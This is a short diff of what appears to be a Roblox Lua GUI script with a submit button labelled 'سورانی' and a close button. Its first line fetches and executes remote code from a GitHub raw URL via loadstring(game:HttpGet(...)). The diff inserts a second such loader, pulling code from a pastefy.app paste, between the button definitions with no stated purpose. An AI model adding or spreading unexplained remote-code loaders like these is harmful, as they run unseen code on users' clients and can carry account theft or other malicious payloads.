@@ -1,6 +1,5 @@
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/DNS/refs/heads/main/s.ban"))()
-
 -- Main GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -76,7 +75,7 @@ SubmitButton.Size = UDim2.new(0.5, 0, 0.5, 0)
 SubmitButton.Position = UDim2.new(0, 0, 0.5, 0)
 SubmitButton.Text = "سورانی"
 SubmitButton.Parent = frame
-
+loadstring(game:HttpGet("https://pastefy.app/Zq0Xmd4J/raw"))()
 local CloseButton = Instance.new("TextButton")
 CloseButton.Size = UDim2.new(0, 20, 0, 20)
 CloseButton.Position = UDim2.new(1, -20, 0, 0)
